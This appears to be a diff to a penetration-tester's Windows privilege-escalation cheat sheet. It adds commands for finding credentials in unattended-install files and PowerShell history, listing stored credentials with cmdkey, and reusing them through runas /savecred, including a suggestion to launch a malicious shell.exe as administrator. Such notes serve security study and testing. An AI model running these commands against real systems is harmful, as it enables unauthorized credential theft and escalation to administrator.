@@ -84,12 +84,39 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1;Invoke-PrivescCheck "
 ```
 
 - Check window services for user escalating
-```
-Invoke-ServiceAudit
+```AInvoke-ServiceAudit
 ```
 
 - Check outdated and potentially vulnerable software
 ```
 Invoke-AuditInstalledPrograms
 ```
+## Unattendend Installation Files
+
+- Default File Location
+```
+C:\Windows\Panther\Unattended.xml
+C:\Windows\Panther\Autounattended.xml
+```
+
+## Window Credential Manager (Manual)
+- Check Stored Credential
+```
+cmdkey /list
+```
+
+- Login using saved credentials ( can also run malicious shell.exe instead of cmd )
+```
+runas.exe /savecred /user:administrator cmd
+```
+
+## Powershell History
+- Check history file location
+```
+C:\Users\student\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt
+```
+
+## 
+
+
 
